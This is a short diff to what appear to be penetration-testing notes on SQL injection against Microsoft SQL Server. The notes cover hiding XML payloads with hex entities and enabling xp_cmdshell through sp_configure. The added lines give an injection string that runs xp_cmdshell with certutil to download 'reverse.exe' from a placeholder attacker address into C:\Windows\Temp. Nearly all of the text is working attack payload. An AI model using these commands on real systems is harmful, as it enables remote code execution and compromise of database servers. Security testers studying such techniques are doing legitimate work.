@@ -2,6 +2,7 @@ XML :
 	# Obfuscate XML :
 	<@hex_entities> SQL ... </@hex_entities>
 
+
 Microsoft SQL Server :
 	Stored procedures : xp_cmdshell ( allow for system commands )
 		==> Attempt to activate it :
@@ -9,5 +10,10 @@ Microsoft SQL Server :
 		RECONFIGURE;
 		EXEC sp_configure 'xp_cmdshell', 1;
 		RECONFIGURE;
+
+
+certutil : ( allow for launching http requests )
+	'; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
+
 
 More secure and modern methods like SQL Server Integration Services (SSIS).
